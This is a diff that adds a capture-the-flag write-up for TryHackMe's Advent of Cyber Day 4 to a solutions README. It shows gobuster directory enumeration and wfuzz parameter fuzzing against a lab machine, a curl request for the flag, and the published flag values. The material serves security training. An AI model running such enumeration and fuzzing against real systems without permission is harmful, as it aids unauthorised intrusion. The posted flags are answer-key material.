@@ -8,7 +8,7 @@ Event Homepage: [`https://tryhackme.com/christmas`](https://tryhackme.com/christ
 - [x] Day 1 - A Christmas Crisis
 - [x] Day 2 - The Elf Strikes Back
 - [x] Day 3 - Christmas Chaos
-- [ ] Day 4 - Santa's watching
+- [x] Day 4 - Santa's watching
 - [ ] Day 5 - Someone stole Santa's gift list!
 - [ ] Day 6 - Be careful with what you wish on a Christmas night
 - [ ] Day 7 - Coal for Christmas
@@ -244,3 +244,102 @@ Now that we have credentials, we can log in and get the flag!
 ![screenshot](day03-christmas-chaos/flag.png)
 
 Flag: `THM{885ffab980e049847516f9d8fe99ad1a}`
+
+# Day 4: Santa's watching
+
+*Category: Web Exploitation*  
+*Tags: Authorization Bypass*  
+
+> Exploit Santa's login form and obtain admin credentials to save Santa's nice list!
+
+IP: `10.10.252.228`
+
+Assets:
+- Wordlist for Gobuster ([danielmiessler/SecLists/Discovery/Web-Content/big.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/big.txt))
+- Wordlist for wfuzz ([available for download](https://assets.tryhackme.com/additional/cmn-aoc2020/day-4/wordlist)) (also in the day04-santas-watching directory)
+
+### Given the URL `http://shibes.xyz/api.php`, what would the entire wfuzz command look like to query the "breed" parameter using the wordlist "big.txt" (assume that "big.txt" is in your current directory)
+
+`wfuzz -z file,big.txt http://shibes.xyz/api.php?breed=FUZZ`
+
+### Basic Enumeration
+
+By know, you probably know the drill. Step 1: visit the website running on port 80.
+
+![screenshot](day04-santas-watching/nothing.png)
+
+Huh, there seems to be not much of interest on the page or in the source code for the page.
+
+### Finding the API directory using Gobuster
+
+We can use gobuster to find hidden directories:
+
+```sh
+gobuster -u http://10.10.252.228/ -w day04-santas-watching/big.txt -x php,txt,html
+```
+
+And we find the following:
+
+```
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.252.228/
+[+] Threads      : 10
+[+] Wordlist     : day04-santas-watching/big.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Extensions   : html,php,txt
+[+] Timeout      : 10s
+=====================================================
+2020/12/04 15:24:55 Starting gobuster
+=====================================================
+/.htpasswd (Status: 403)
+/.htpasswd.php (Status: 403)
+/.htpasswd.txt (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd.html (Status: 403)
+/.htaccess.php (Status: 403)
+/.htaccess.txt (Status: 403)
+/.htaccess.html (Status: 403)
+/LICENSE (Status: 200)
+/api (Status: 301)
+```
+
+If we visit `http://10.10.252.228/api` we can find the empty `site-log.php` file.
+
+### Fuzz the date parameter on the file you found in the API directory. What is the flag displayed in the correct post?
+
+We can use the following wfuzz command to fuzz the date get parameter:
+
+```sh
+wfuzz -c --hh 0 -z file,day04-santas-watching/wordlist http://10.10.252.228/api/site-log.php?date=FUZZ
+```
+
+After running the command, we get the following output:
+
+```
+Target: http://10.10.252.228/api/site-log.php?date=FUZZ
+Total requests: 63
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload                                                                                                                                                     
+===================================================================
+
+000000026:   200        0 L      1 W      13 Ch       "20201125"                                                                                                                                                  
+
+Total time: 3.005774
+Processed Requests: 63
+Filtered Requests: 62
+Requests/sec.: 20.95965
+```
+
+### Getting the flag
+
+Now that we know where to find the flag, we can simply use cURL to actually get the flag:
+
+```
+curl http://10.10.252.228/api/site-log.php?date=20201125
+```
+
+Flag: `THM{D4t3_AP1}`
